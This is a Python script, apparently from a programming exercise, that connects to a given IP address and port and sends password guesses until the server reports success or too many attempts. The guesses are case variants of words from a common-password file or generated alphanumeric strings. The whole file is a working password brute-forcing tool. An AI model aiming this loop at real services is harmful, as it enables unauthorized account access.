import argparse
import itertools
import os
import socket
import string

parser = argparse.ArgumentParser()
parser.add_argument("ip_adress", help="IP adress")
parser.add_argument("port", help="port")

def elements():
    alphabet = list(string.ascii_lowercase)
    numbers = list(string.digits)
    alphabet.extend(numbers)
    return alphabet

def brute_force_generator():
    extend = elements()
    base = [""]
    while True:
        new_base = []
        for first, second in itertools.product(base, extend):
            combination = first + second
            new_base.append(combination)
            yield combination
        base = new_base


def common_pw_generator():
    with open("passwords.txt", 'r') as file:
        common_pw = file.readlines()
    for pw in common_pw:
        upper_lower_combinations = map(lambda x: "".join(x),
                                       itertools.product(
                                           *([letter.lower(), letter.upper()]
                                             for letter in pw.strip())))
        for combination in upper_lower_combinations:
            yield combination


if __name__ == "__main__":
    args = parser.parse_args()
    guess_generator = common_pw_generator()

    with socket.socket() as client_socket:
        address = (args.ip_adress, int(args.port))
        client_socket.connect(address)
        stop = False
        while not stop:
            guess = next(guess_generator)
            client_socket.send(guess.encode())
            response = client_socket.recv(1024)
            match response.decode():
                case "Connection success!":
                    print(guess)
                    stop = True
                case "Too many attempts":
                    stop = True